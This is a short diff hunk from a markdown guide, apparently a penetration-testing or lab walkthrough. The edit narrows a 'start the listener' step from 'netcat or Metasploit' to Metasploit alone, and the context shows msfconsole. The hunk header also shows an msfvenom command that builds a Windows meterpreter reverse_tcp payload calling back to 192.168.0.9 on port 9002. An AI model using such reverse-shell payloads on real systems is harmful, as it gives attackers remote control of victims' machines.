@@ -65,7 +65,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.9 LPORT=9002 -f 
 
 ### Start the Listener:
 
--Use netcat or Metasploit to listen for connections.
+-Use Metasploit to listen for connections.
 
 ``` bash
 msfconsole
